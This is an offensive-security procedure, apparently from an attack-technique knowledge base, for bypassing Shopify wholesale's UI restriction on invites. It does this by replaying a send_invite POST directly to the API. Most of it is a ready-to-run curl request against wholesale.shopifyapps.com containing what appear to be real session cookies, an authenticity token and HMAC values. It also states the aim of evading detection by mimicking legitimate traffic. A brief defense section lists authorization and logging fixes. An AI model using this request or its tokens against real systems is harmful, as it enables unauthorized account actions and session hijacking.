---
tags:
  - shopify
  - api-bypass
  - authorization
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-send-invite-post]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:18.653Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: f0d97503-b09c-4e32-b09c-b7f7986fe55f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Bypass-UI-Restrictions-with-Send-Invite-API

## Summary

This procedure intercepts a UI attempt to send an invite and replays it as a direct POST request to the send_invite API endpoint, bypassing the UI's enforcement of active account checks and preparing the account for link generation.

## Description

The Shopify wholesale UI prevents invites to enabled accounts, but the underlying API at /admin/shops/{shop_id}/accounts/{account_id}/send_invite lacks proper validation for account status. Using Burp Suite, craft and send the request with authenticity_token and session cookies from a low-priv staff session, succeeding where UI fails.

## Requirements

1. Burp Suite intercepting browser traffic
2. Captured authenticity_token from UI attempt
3. Target account ID and shop ID (e.g., shop 19596, account 5182518)
4. Valid staff session cookies

## Defense

Defensive measures and detection strategies:

- Implement consistent authorization checks in all API endpoints matching UI logic
- Rate-limit and log API calls to invite endpoints from staff accounts
- Audit for discrepancies between UI and API behaviors in wholesale feature

## Objectives

1. Trigger invite preparation without status enforcement
2. Maintain session validity for follow-up requests
3. Avoid detection by mimicking legitimate traffic

## Instructions

### Step 1: Intercept UI Request

**Context**: Attempt UI action to capture base request structure.

Use browser (proxied via Burp) to click 'Send invite' on target account, observe error, and intercept the failed request.

> Request captured with headers like Content-Type: application/x-www-form-urlencoded, including authenticity_token.

### Step 2: Modify and Replay Request

**Context**: Adjust the intercepted request to target the API directly, replacing placeholders.

Execute [[commands/shopify-send-invite-post]] via Burp Repeater or curl:

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/send_invite' \
  -H 'Host: wholesale.shopifyapps.com' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518?hmac=adf5598e786b95e73d4c6637a457ea38a01f7fb99a14b480c7fbe9c22e53ef80&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529478' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: https://wholesale.shopifyapps.com' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-Fetch-Dest: iframe' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Te: trailers' \
  -H 'Connection: close' \
  --data-raw 'authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D'
```

> Response: HTTP 200 OK or redirect, indicating invite queued without error for enabled account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/shopify-send-invite-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- api-bypass
- send-invite
- csrf
